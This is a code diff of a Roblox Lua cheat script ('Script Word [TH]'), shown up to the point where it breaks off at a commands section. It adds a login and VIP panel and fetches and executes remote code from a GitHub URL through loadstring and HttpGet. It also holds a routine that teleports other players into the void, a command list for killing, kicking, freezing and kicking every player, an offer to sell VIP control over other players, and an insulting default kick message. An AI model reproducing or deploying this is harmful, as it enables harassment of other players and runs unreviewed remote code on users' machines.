@@ -1,470 +1,379 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/back%20pack"))()
--- [[ Script Word [TH] - Neon Edition (Enhanced Background Effect) ]]
+-- [[ Script Word [TH] - Neon Edition (Full Version with Welcome Effects) ]]
 
 local Player = game.Players.LocalPlayer
-local Camera = workspace.CurrentCamera
-local MyName = Player.Name
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ExpectedName = Player.Name 
 
--- [Logics] ระบบสิทธิ์การใช้งาน
-_G.VIP_LIST = _G.VIP_LIST or {
-    ["ffsww_1007"] = true, ["A_ASPD"] = true, ["HACKER_18050"] = true,
-    ["evils915"] = true, ["TV_BTS1"] = true, ["Winwie001"] = true,
-    ["zx71828"] = true
+local VIP_DATA = {
+    ["ffsww_1007"] = "CREATOR",
+    ["A_ASPD"] = "CREATOR",
+    ["HACKER_18050"] = "VIP",
+    ["evils915"] = "VIP",
+    ["TV_BTS1"] = "VIP",
+    ["Winwie001"] = "VIP",
+    ["zx71828"] = "VIP"
 }
-local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
-local GIFTED_LIST = {} 
-local HAS_COMMAND_POWER = {}
-local ACTIVE_USERS = {}
-local VOID_TARGETS = {} -- เก็บรายชื่อคนที่โดน Void
 
--- [Start Logic] ฟังก์ชันสำหรับเล่นเสียง UI
-local function PlayUISound(id)
-    local s = Instance.new("Sound", game.Workspace)
-    s.SoundId = "rbxassetid://"..tostring(id)
-    s.Volume = 1
-    s:Play()
-    game:GetService("Debris"):AddItem(s, 2)
+local LoginGui = Instance.new("ScreenGui", game.CoreGui)
+
+local LoginFrame = Instance.new("Frame", LoginGui)
+LoginFrame.Size = UDim2.new(0, 300, 0, 180)
+LoginFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
+LoginFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+LoginFrame.BorderSizePixel = 0
+Instance.new("UICorner", LoginFrame)
+
+local LeftSide = Instance.new("Frame", LoginFrame)
+LeftSide.Size = UDim2.new(0, 160, 1, 0)
+LeftSide.Position = UDim2.new(0, -170, 0, 0)
+LeftSide.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+LeftSide.BorderSizePixel = 0
+Instance.new("UICorner", LeftSide)
+
+local RuleTitle = Instance.new("TextLabel", LeftSide)
+RuleTitle.Size = UDim2.new(1, 0, 0, 25)
+RuleTitle.Text = "RULES & DISCORD"
+RuleTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
+RuleTitle.BackgroundTransparency = 1
+RuleTitle.Font = Enum.Font.FredokaOne
+RuleTitle.TextSize = 13
+
+local RuleText = Instance.new("TextLabel", LeftSide)
+RuleText.Size = UDim2.new(1, -10, 0, 100)
+RuleText.Position = UDim2.new(0, 5, 0, 25)
+RuleText.Text = "• เรื้อนเกินไปโดนแบนสคริปต์\n• สร้างความเดือดร้อนโดนแบนถาวร\n• ซื้อ VIP ติดต่อในดิสคอร์ด\n• ราคา 20 บาท (มีคำสั่งคุมคนปกติ🤑)"
+RuleText.TextColor3 = Color3.fromRGB(200, 200, 200)
+RuleText.BackgroundTransparency = 1
+RuleText.Font = Enum.Font.SourceSansBold
+RuleText.TextSize = 11
+RuleText.TextWrapped = true
+RuleText.TextYAlignment = Enum.TextYAlignment.Top
+RuleText.TextXAlignment = Enum.TextXAlignment.Left
+
+local CopyDiscordBtn = Instance.new("TextButton", LeftSide)
+CopyDiscordBtn.Size = UDim2.new(0.9, 0, 0, 30)
+CopyDiscordBtn.Position = UDim2.new(0.05, 0, 0.78, 0)
+CopyDiscordBtn.Text = "COPY DISCORD LINK"
+CopyDiscordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+CopyDiscordBtn.TextColor3 = Color3.new(1, 1, 1)
+CopyDiscordBtn.Font = Enum.Font.FredokaOne
+CopyDiscordBtn.TextSize = 12
+Instance.new("UICorner", CopyDiscordBtn)
+
+CopyDiscordBtn.MouseButton1Click:Connect(function()
+    setclipboard("https://discord.gg/G3qjfaNRy")
+    CopyDiscordBtn.Text = "COPIED!"
+    task.wait(2)
+    CopyDiscordBtn.Text = "COPY DISCORD LINK"
+end)
+
+local SideList = Instance.new("Frame", LoginFrame)
+SideList.Size = UDim2.new(0, 150, 1, 0)
+SideList.Position = UDim2.new(1, 10, 0, 0)
+SideList.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+SideList.BorderSizePixel = 0
+Instance.new("UICorner", SideList)
+
+local SideTitle = Instance.new("TextLabel", SideList)
+SideTitle.Size = UDim2.new(1, 0, 0, 30)
+SideTitle.Text = "VIP & CREATOR"
+SideTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
+SideTitle.BackgroundTransparency = 1
+SideTitle.Font = Enum.Font.FredokaOne
+SideTitle.TextSize = 14
+
+local SideScroll = Instance.new("ScrollingFrame", SideList)
+SideScroll.Size = UDim2.new(1, -10, 1, -40)
+SideScroll.Position = UDim2.new(0, 5, 0, 35)
+SideScroll.BackgroundTransparency = 1
+SideScroll.ScrollBarThickness = 2
+SideScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+local ListLayout = Instance.new("UIListLayout", SideScroll)
+ListLayout.Padding = UDim.new(0, 5)
+
+for name, tag in pairs(VIP_DATA) do
+    local label = Instance.new("TextLabel", SideScroll)
+    label.Size = UDim2.new(1, 0, 0, 20)
+    label.BackgroundTransparency = 1
+    label.Text = "[" .. tag .. "] " .. name
+    label.Font = Enum.Font.SourceSansBold
+    label.TextSize = 12
+    label.TextColor3 = (tag == "CREATOR") and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(255, 215, 0)
+    SideScroll.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y)
 end
 
--- ระบบตรวจจับการเดินชน (Touch Detection) - อัปเกรดให้รองรับทุกคนที่รันสคริปต์
-local function SetupTouchVoid(char)
-    local root = char:WaitForChild("HumanoidRootPart")
-    root.Touched:Connect(function(hit)
-        -- เช็คว่าคนที่เดินชนมีอำนาจสั่งการหรือไม่ (Admin หรือ คนที่ได้ Cmd)
-        if ADMIN_COMMANDER[Player.Name] or HAS_COMMAND_POWER[Player.Name] then
-            local hPlayer = game.Players:GetPlayerFromCharacter(hit.Parent)
-            if hPlayer and VOID_TARGETS[hPlayer.Name] then
-                local targetRoot = hit.Parent:FindFirstChild("HumanoidRootPart")
-                if targetRoot then
-                    -- พิกัดวาร์ปตามที่ระบุ
-                    targetRoot.CFrame = CFrame.new(102.228256, -496.832855, 407.202423, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+local ScriptNameLabel = Instance.new("TextLabel", LoginFrame)
+ScriptNameLabel.Size = UDim2.new(1, 0, 0, 30)
+ScriptNameLabel.Position = UDim2.new(0, 0, 0, 5)
+ScriptNameLabel.Text = "Script Word [TH]"
+ScriptNameLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+ScriptNameLabel.BackgroundTransparency = 1
+ScriptNameLabel.Font = Enum.Font.FredokaOne
+ScriptNameLabel.TextSize = 20
+
+local LoginTitle = Instance.new("TextLabel", LoginFrame)
+LoginTitle.Size = UDim2.new(1, 0, 0, 30)
+LoginTitle.Position = UDim2.new(0, 0, 0, 35)
+LoginTitle.Text = "กรุณากรอกชื่อตัวละครเพื่อเข้าใช้งาน"
+LoginTitle.TextColor3 = Color3.new(1, 1, 1)
+LoginTitle.BackgroundTransparency = 1
+LoginTitle.Font = Enum.Font.FredokaOne
+LoginTitle.TextSize = 14
+
+local NameInput = Instance.new("TextBox", LoginFrame)
+NameInput.Size = UDim2.new(0.8, 0, 0, 40)
+NameInput.Position = UDim2.new(0.1, 0, 0.45, 0)
+NameInput.PlaceholderText = "กรอกชื่อของคุณที่นี่..."
+NameInput.Text = ""
+NameInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+NameInput.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", NameInput)
+
+local StartBtn = Instance.new("TextButton", LoginFrame)
+StartBtn.Size = UDim2.new(0.5, 0, 0, 35)
+StartBtn.Position = UDim2.new(0.25, 0, 0.75, 0)
+StartBtn.Text = "START SCRIPT"
+StartBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+StartBtn.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("UICorner", StartBtn)
+
+-- [[ MAIN FUNCTION START ]]
+local function RunMainScript()
+    LoginGui:Destroy()
+    
+    local MyName = Player.Name
+    local UserInputService = game:GetService("UserInputService")
+    local TweenService = game:GetService("TweenService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+    -- [Start Logic] ฟังก์ชันแสดงข้อความต้อนรับ
+    local function ShowWelcome()
+        local WelcomeGui = Instance.new("ScreenGui", game.CoreGui)
+        
+        local function CreateNotify(text, pos)
+            local label = Instance.new("TextLabel", WelcomeGui)
+            label.Size = UDim2.new(0, 250, 0, 40); label.Position = pos; label.BackgroundTransparency = 1
+            label.Text = text; label.TextColor3 = Color3.new(1, 1, 1); label.Font = Enum.Font.FredokaOne; label.TextSize = 14; label.TextTransparency = 1
+            local WS = Instance.new("UIStroke", label); WS.Thickness = 2; WS.Color = Color3.fromRGB(255, 0, 0); WS.Transparency = 1
+            return label, WS
+        end
+
+        local function PlaySound(id)
+            local s = Instance.new("Sound", game.Workspace); s.SoundId = "rbxassetid://"..tostring(id); s.Volume = 2; s:Play(); game:GetService("Debris"):AddItem(s, 5)
+        end
+
+        task.wait(1)
+        PlaySound(108729338139883)
+        local L1, S1 = CreateNotify("Welcome to Script Word", UDim2.new(0.5, -125, 0.1, 0))
+        TweenService:Create(L1, TweenInfo.new(0.8), {TextTransparency = 0}):Play(); TweenService:Create(S1, TweenInfo.new(0.8), {Transparency = 0}):Play()
+        task.wait(2.5)
+        
+        PlaySound(104447039817401)
+        local L2, S2 = CreateNotify("By Owner Human", UDim2.new(0.5, -125, 0.15, 0))
+        TweenService:Create(L2, TweenInfo.new(0.8), {TextTransparency = 0}):Play(); TweenService:Create(S2, TweenInfo.new(0.8), {Transparency = 0}):Play()
+        task.wait(1.5)
+
+        PlaySound(114665895100803)
+        local L3, S3 = CreateNotify("Monster Kill", UDim2.new(0.5, -125, 0.2, 0))
+        L3.TextColor3 = Color3.fromRGB(255, 50, 50)
+        TweenService:Create(L3, TweenInfo.new(0.5), {TextTransparency = 0}):Play(); TweenService:Create(S3, TweenInfo.new(0.5), {Transparency = 0}):Play()
+        
+        task.wait(3)
+        TweenService:Create(L1, TweenInfo.new(1), {TextTransparency = 1}):Play(); TweenService:Create(S1, TweenInfo.new(1), {Transparency = 1}):Play()
+        TweenService:Create(L2, TweenInfo.new(1), {TextTransparency = 1}):Play(); TweenService:Create(S2, TweenInfo.new(1), {Transparency = 1}):Play()
+        TweenService:Create(L3, TweenInfo.new(1), {TextTransparency = 1}):Play(); TweenService:Create(S3, TweenInfo.new(1), {Transparency = 1}):Play()
+        task.wait(1); WelcomeGui:Destroy()
+    end
+    task.spawn(ShowWelcome)
+
+    -- [Load Core]
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/back%20pack"))()
+
+    _G.VIP_LIST = _G.VIP_LIST or {["ffsww_1007"] = true, ["A_ASPD"] = true, ["HACKER_18050"] = true, ["evils915"] = true, ["TV_BTS1"] = true, ["Winwie001"] = true, ["zx71828"] = true}
+    local ADMIN_COMMANDER = {["ffsww_1007"] = true, ["A_ASPD"] = true}
+    local HAS_COMMAND_POWER, ACTIVE_USERS, VOID_TARGETS = {}, {}, {}
+
+    local function PlayUISound(id)
+        local s = Instance.new("Sound", game.Workspace); s.SoundId = "rbxassetid://"..tostring(id); s.Volume = 1; s:Play(); game:GetService("Debris"):AddItem(s, 2)
+    end
+
+    local function SetupTouchVoid(char)
+        local root = char:WaitForChild("HumanoidRootPart")
+        root.Touched:Connect(function(hit)
+            if ADMIN_COMMANDER[MyName] or HAS_COMMAND_POWER[MyName] then
+                local hPlayer = game.Players:GetPlayerFromCharacter(hit.Parent)
+                if hPlayer and VOID_TARGETS[hPlayer.Name] then
+                    local targetRoot = hit.Parent:FindFirstChild("HumanoidRootPart")
+                    if targetRoot then
+                        targetRoot.CFrame = CFrame.new(102.228256, -496.832855, 407.202423)
+                    end
                 end
             end
-        end
-    end)
-end
+        end)
+    end
+    if Player.Character then SetupTouchVoid(Player.Character) end
+    Player.CharacterAdded:Connect(SetupTouchVoid)
 
-if Player.Character then SetupTouchVoid(Player.Character) end
-Player.CharacterAdded:Connect(SetupTouchVoid)
-
--- [Effect Logic] ฟังก์ชันเพิ่มพื้นหลังเคลื่อนไหว
-local function AddBackgroundEffect(frame)
-    local gradient = Instance.new("UIGradient", frame)
-    gradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, frame.BackgroundColor3),
-        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(60, 60, 60)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 80, 80)),
-        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(60, 60, 60)),
-        ColorSequenceKeypoint.new(1, frame.BackgroundColor3)
-    })
-    
-    task.spawn(function()
-        local offset = -1
-        while true do
-            gradient.Offset = Vector2.new(offset, 0)
-            offset = offset + 0.015
-            if offset >= 1 then offset = -1 end
-            task.wait(0.01)
-        end
-    end)
-end
-
--- [Start Logic] ลำดับการแสดงผล
-local function ShowWelcome()
-    local WelcomeGui = Instance.new("ScreenGui", game.CoreGui)
-    
-    local function CreateNotify(text, pos)
-        local label = Instance.new("TextLabel", WelcomeGui)
-        label.Size = UDim2.new(0, 250, 0, 40)
-        label.Position = pos
-        label.BackgroundTransparency = 1
-        label.Text = text
-        label.TextColor3 = Color3.new(1, 1, 1)
-        label.Font = Enum.Font.FredokaOne
-        label.TextSize = 14
-        label.TextTransparency = 1
-        local WS = Instance.new("UIStroke", label)
-        WS.Thickness = 2; WS.Color = Color3.fromRGB(255, 0, 0); WS.Transparency = 1
-        return label, WS
+    local function MakeDraggable(frame)
+        local dragging, dragInput, dragStart, startPos
+        frame.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true; dragStart = input.Position; startPos = frame.Position; input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end) end end)
+        frame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end end)
+        UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then local delta = input.Position - dragStart; frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
     end
 
-    local function PlaySound(id)
-        local s = Instance.new("Sound", game.Workspace)
-        s.SoundId = "rbxassetid://"..tostring(id)
-        s.Volume = 2
-        s:Play()
-        game:GetService("Debris"):AddItem(s, 5)
+    local function ApplyNeonEffect(frame, color)
+        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10); local stroke = Instance.new("UIStroke", frame); stroke.Thickness = 2.5; stroke.Color = color
+        task.spawn(function() while true do TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.2, Thickness = 3.5}):Play(); task.wait(1); TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.7, Thickness = 2}):Play(); task.wait(1) end end)
     end
 
-    task.wait(5)
-    PlaySound(108729338139883)
-    local L1, S1 = CreateNotify("Welcome to Script Word", UDim2.new(0.5, -125, 0.1, 0))
-    TweenService:Create(L1, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
-    TweenService:Create(S1, TweenInfo.new(0.8), {Transparency = 0}):Play()
-    task.wait(2.5)
-    
-    PlaySound(104447039817401)
-    local L2, S2 = CreateNotify("By Owner Human", UDim2.new(0.5, -125, 0.15, 0))
-    TweenService:Create(L2, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
-    TweenService:Create(S2, TweenInfo.new(0.8), {Transparency = 0}):Play()
-    task.wait(1.5)
+    -- [[ UI SECTIONS ]]
+    local MainGui = Instance.new("ScreenGui", game.CoreGui)
+    local MasterFrame = Instance.new("Frame", MainGui)
+    MasterFrame.Size = UDim2.new(0, 750, 0, 300); MasterFrame.Position = UDim2.new(0.5, -375, 0.5, -150); MasterFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10); MasterFrame.BackgroundTransparency = 0.1
+    ApplyNeonEffect(MasterFrame, Color3.fromRGB(255, 200, 0)); MakeDraggable(MasterFrame)
+    local Layout = Instance.new("UIListLayout", MasterFrame); Layout.FillDirection = Enum.FillDirection.Horizontal; Layout.Padding = UDim.new(0, 8); Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center; Layout.VerticalAlignment = Enum.VerticalAlignment.Center
 
-    PlaySound(114665895100803)
-    local L3, S3 = CreateNotify("Monster Kill", UDim2.new(0.5, -125, 0.2, 0))
-    L3.TextColor3 = Color3.fromRGB(255, 50, 50)
-    TweenService:Create(L3, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
-    TweenService:Create(S3, TweenInfo.new(0.5), {Transparency = 0}):Play()
-    
-    task.wait(3)
-    TweenService:Create(L1, TweenInfo.new(1), {TextTransparency = 1}):Play()
-    TweenService:Create(S1, TweenInfo.new(1), {Transparency = 1}):Play()
-    TweenService:Create(L2, TweenInfo.new(1), {TextTransparency = 1}):Play()
-    TweenService:Create(S2, TweenInfo.new(1), {Transparency = 1}):Play()
-    TweenService:Create(L3, TweenInfo.new(1), {TextTransparency = 1}):Play()
-    TweenService:Create(S3, TweenInfo.new(1), {Transparency = 1}):Play()
-    
-    task.wait(1)
-    WelcomeGui:Destroy()
-end
-
-task.spawn(ShowWelcome)
-
-local function MakeDraggable(frame)
-    local dragging, dragInput, dragStart, startPos
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true; dragStart = input.Position; startPos = frame.Position
-            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
-        end
-    end)
-    frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
-local function ApplyNeonEffect(frame, color)
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
-    local stroke = Instance.new("UIStroke", frame)
-    stroke.Thickness = 2.5; stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; stroke.Color = color
-    task.spawn(function()
-        while true do
-            TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.2, Thickness = 3.5}):Play()
-            task.wait(1)
-            TweenService:Create(stroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.7, Thickness = 2}):Play()
-            task.wait(1)
-        end
-    end)
-end
-
-local function CustomKick()
-    local Sound = Instance.new("Sound", game.Workspace)
-    local sId = KickSoundInp.Text
-    if not sId:find("rbxassetid://") then sId = "rbxassetid://"..sId end
-    Sound.SoundId = sId; Sound.Volume = 5; Sound:Play()
-    local ScreenGuiK = Instance.new("ScreenGui", game.CoreGui)
-    ScreenGuiK.IgnoreGuiInset = true
-    local TextLabel = Instance.new("TextLabel", ScreenGuiK)
-    TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0); TextLabel.Size = UDim2.new(1, 0, 1, 0)
-    TextLabel.Text = KickTextInp.Text; TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    TextLabel.TextScaled = true; TextLabel.ZIndex = 999999
-    task.wait(3.5)
-    Player:Kick("\n\n[ Humanx1 System ]\n"..KickTextInp.Text.."\n")
-    ScreenGuiK:Destroy()
-end
-
--- [[ UI SYSTEM ]]
-local MainGui = Instance.new("ScreenGui", game.CoreGui)
-MainGui.Name = "ScriptWordTH_Extreme"
-
-local AdminPanel = Instance.new("Frame", MainGui)
-AdminPanel.Size = UDim2.new(0, 260, 0, 320); AdminPanel.Position = UDim2.new(0.5, -130, 0.5, -160)
-AdminPanel.BackgroundColor3 = Color3.fromRGB(15, 5, 5); AdminPanel.BackgroundTransparency = 0.1; AdminPanel.Visible = false
-ApplyNeonEffect(AdminPanel, Color3.fromRGB(255, 0, 0)); MakeDraggable(AdminPanel); AddBackgroundEffect(AdminPanel)
-
-local AdminTitle = Instance.new("TextLabel", AdminPanel)
-AdminTitle.Size = UDim2.new(1, 0, 0, 35); AdminTitle.Text = "Commands Script Word [TH]"
-AdminTitle.TextColor3 = Color3.fromRGB(255, 50, 50); AdminTitle.BackgroundTransparency = 1
-AdminTitle.Font = Enum.Font.FredokaOne; AdminTitle.TextSize = 14
-
-local HelpList = Instance.new("TextLabel", AdminPanel)
-HelpList.Size = UDim2.new(0.9, 0, 0, 110); HelpList.Position = UDim2.new(0.05, 0, 0.12, 0)
-HelpList.BackgroundTransparency = 1; HelpList.TextColor3 = Color3.fromRGB(200, 200, 200)
-HelpList.Text = "!kill [n] | !kick [n] | !tp [n] | !freeze [n]\n!spin [n] [spd] | !unspin [n]\n!fire [n] | !fireRB [n] | !smoke [n]\n!void [n] | !unvoid [n]\n!givevip [n] | !killall | !kickall"
-HelpList.Font = Enum.Font.SourceSansBold; HelpList.TextSize = 11
-
-KickTextInp = Instance.new("TextBox", AdminPanel)
-KickTextInp.Size = UDim2.new(0.9, 0, 0, 32); KickTextInp.Position = UDim2.new(0.05, 0, 0.45, 0)
-KickTextInp.BackgroundColor3 = Color3.fromRGB(25, 25, 25); KickTextInp.TextColor3 = Color3.new(1,1,1)
-Instance.new("UICorner", KickTextInp); KickTextInp.Text = "โดนกูเตะไงไอ้ควาย"
-
-KickSoundInp = Instance.new("TextBox", AdminPanel)
-KickSoundInp.Size = UDim2.new(0.9, 0, 0, 32); KickSoundInp.Position = UDim2.new(0.05, 0, 0.58, 0)
-KickSoundInp.BackgroundColor3 = Color3.fromRGB(25, 25, 25); KickSoundInp.TextColor3 = Color3.new(1,1,1)
-Instance.new("UICorner", KickSoundInp); KickSoundInp.Text = "rbxassetid://137337370812885"
-
-local CmdBar = Instance.new("TextBox", AdminPanel)
-CmdBar.Size = UDim2.new(0.9, 0, 0, 40); CmdBar.Position = UDim2.new(0.05, 0, 0.82, 0)
-CmdBar.BackgroundColor3 = Color3.fromRGB(10, 30, 10); CmdBar.TextColor3 = Color3.fromRGB(0, 255, 120)
-CmdBar.PlaceholderText = "> ENTER COMMAND..."; Instance.new("UICorner", CmdBar)
-
-local Board = Instance.new("Frame", MainGui)
-Board.Size = UDim2.new(0, 210, 0, 260); Board.Position = UDim2.new(0.85, 0, 0.3, 0)
-Board.BackgroundColor3 = Color3.fromRGB(10, 10, 10); Board.BackgroundTransparency = 0.15
-ApplyNeonEffect(Board, Color3.fromRGB(255, 215, 0)); MakeDraggable(Board); AddBackgroundEffect(Board)
-
-local BoardTitle = Instance.new("TextLabel", Board)
-BoardTitle.Size = UDim2.new(1, 0, 0, 40); BoardTitle.Text = "Script Word [TH]"
-BoardTitle.TextColor3 = Color3.fromRGB(255, 215, 0); BoardTitle.BackgroundTransparency = 1
-BoardTitle.Font = Enum.Font.FredokaOne; BoardTitle.TextSize = 15
-
-local Scroll = Instance.new("ScrollingFrame", Board)
-Scroll.Size = UDim2.new(1, -10, 1, -55); Scroll.Position = UDim2.new(0, 5, 0, 45)
-Scroll.BackgroundTransparency = 1; Scroll.ScrollBarThickness = 2
-
--- [[ PRIVATE CHAT SYSTEM ]]
-local ChatFrame = Instance.new("Frame", MainGui)
-ChatFrame.Size = UDim2.new(0, 280, 0, 220); ChatFrame.Position = UDim2.new(0.05, 0, 0.65, 0)
-ChatFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15); ChatFrame.BackgroundTransparency = 0.2; ChatFrame.Visible = false
-ApplyNeonEffect(ChatFrame, Color3.fromRGB(0, 255, 255)); MakeDraggable(ChatFrame); AddBackgroundEffect(ChatFrame)
-
-local ChatTitle = Instance.new("TextLabel", ChatFrame)
-ChatTitle.Size = UDim2.new(1, 0, 0, 25); ChatTitle.Text = "Private Chat (Active Users Only)"; ChatTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
-ChatTitle.BackgroundTransparency = 1; ChatTitle.Font = Enum.Font.FredokaOne; ChatTitle.TextSize = 10
-
-local ChatScroll = Instance.new("ScrollingFrame", ChatFrame)
-ChatScroll.Size = UDim2.new(1, -10, 1, -70); ChatScroll.Position = UDim2.new(0, 5, 0, 30)
-ChatScroll.BackgroundTransparency = 0.9; ChatScroll.ScrollBarThickness = 2; ChatScroll.CanvasSize = UDim2.new(0,0,0,0)
-local ChatList = Instance.new("UIListLayout", ChatScroll)
-ChatList.Padding = UDim.new(0, 2); ChatList.SortOrder = Enum.SortOrder.LayoutOrder
-
-local ChatInput = Instance.new("TextBox", ChatFrame)
-ChatInput.Size = UDim2.new(1, -10, 0, 30); ChatInput.Position = UDim2.new(0, 5, 1, -35)
-ChatInput.BackgroundColor3 = Color3.fromRGB(20, 20, 30); ChatInput.TextColor3 = Color3.new(1, 1, 1)
-ChatInput.PlaceholderText = "Type message here..."; ChatInput.Text = ""; Instance.new("UICorner", ChatInput)
-
-local function AddChatMessage(senderName, msgText, color)
-    local l = Instance.new("TextLabel", ChatScroll)
-    l.Size = UDim2.new(1, -10, 0, 20); l.BackgroundTransparency = 1
-    l.Text = "[" .. senderName .. "]: " .. msgText
-    l.TextColor3 = color or Color3.new(1, 1, 1)
-    l.Font = Enum.Font.SourceSansBold; l.TextSize = 14; l.TextXAlignment = Enum.TextXAlignment.Left
-    l.TextWrapped = true; l.AutomaticSize = Enum.AutomaticSize.Y
-    
-    task.wait(0.05)
-    ChatScroll.CanvasSize = UDim2.new(0, 0, 0, ChatList.AbsoluteContentSize.Y)
-    ChatScroll.CanvasPosition = Vector2.new(0, ChatList.AbsoluteContentSize.Y)
-end
-
-local function GetChatColor(name)
-    if ADMIN_COMMANDER[name] then return Color3.fromRGB(255, 50, 50) end
-    if _G.VIP_LIST[name] then return Color3.fromRGB(255, 215, 0) end
-    return Color3.fromRGB(100, 255, 255)
-end
-
-ChatInput.FocusLost:Connect(function(enter)
-    if enter and ChatInput.Text ~= "" then
-        local myMsg = ChatInput.Text
-        AddChatMessage(MyName, myMsg, GetChatColor(MyName))
-        local fullMsg = "[SW_CHAT]" .. myMsg
-        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-        if chatEvent then chatEvent.SayMessageRequest:FireServer(fullMsg, "All") end
-        ChatInput.Text = ""
+    local function CreateSection(parent, size)
+        local f = Instance.new("Frame", parent); f.Size = size; f.BackgroundColor3 = Color3.fromRGB(20, 20, 20); f.BackgroundTransparency = 0.5; f.BorderSizePixel = 0
+        Instance.new("UICorner", f); local s = Instance.new("UIStroke", f); s.Color = Color3.fromRGB(40, 40, 40); s.Thickness = 1
+        local p = Instance.new("UIPadding", f); p.PaddingTop = UDim.new(0, 5); p.PaddingBottom = UDim.new(0, 5); p.PaddingLeft = UDim.new(0, 5); p.PaddingRight = UDim.new(0, 5)
+        return f
     end
-end)
 
-local function CreateBtn(txt, pos, color)
-    local b = Instance.new("TextButton", MainGui)
-    b.Size = UDim2.new(0, 48, 0, 48); b.Position = pos; b.Text = txt
-    b.BackgroundColor3 = color; b.TextColor3 = Color3.new(1,1,1); b.Font = Enum.Font.FredokaOne
-    b.TextSize = 20; Instance.new("UICorner", b).CornerRadius = UDim.new(1, 0)
-    local bs = Instance.new("UIStroke", b); bs.Thickness = 2; bs.Color = Color3.new(1,1,1)
-    b.MouseEnter:Connect(function() TweenService:Create(b, TweenInfo.new(0.3), {Size = UDim2.new(0, 55, 0, 55), BackgroundColor3 = Color3.new(1,1,1), TextColor3 = color}):Play() end)
-    b.MouseLeave:Connect(function() TweenService:Create(b, TweenInfo.new(0.3), {Size = UDim2.new(0, 48, 0, 48), BackgroundColor3 = color, TextColor3 = Color3.new(1,1,1)}):Play() end)
-    b.MouseButton1Click:Connect(function() PlayUISound(452267918) end)
-    MakeDraggable(b); return b
-end
+    -- BOARD SECTION
+    local BoardSide = CreateSection(MasterFrame, UDim2.new(0, 200, 0.94, 0))
+    local BTitle = Instance.new("TextLabel", BoardSide); BTitle.Size = UDim2.new(1,0,0,30); BTitle.Text = "ACTIVE USERS"; BTitle.TextColor3 = Color3.fromRGB(255, 215, 0); BTitle.Font = Enum.Font.FredokaOne; BTitle.BackgroundTransparency = 1; BTitle.TextSize = 16
+    local BScroll = Instance.new("ScrollingFrame", BoardSide); BScroll.Size = UDim2.new(1,0,1,-35); BScroll.Position = UDim2.new(0,0,0,35); BScroll.BackgroundTransparency = 1; BScroll.ScrollBarThickness = 2
+    local BList = Instance.new("UIListLayout", BScroll); BList.Padding = UDim.new(0,5)
 
--- [[ UI Buttons ]]
-local MinBoardBtn = CreateBtn("📜", UDim2.new(0.95, -50, 0.3, 0), Color3.fromRGB(0, 120, 255))
-MinBoardBtn.MouseButton1Click:Connect(function() Board.Visible = not Board.Visible end)
+    -- COMMANDS SECTION
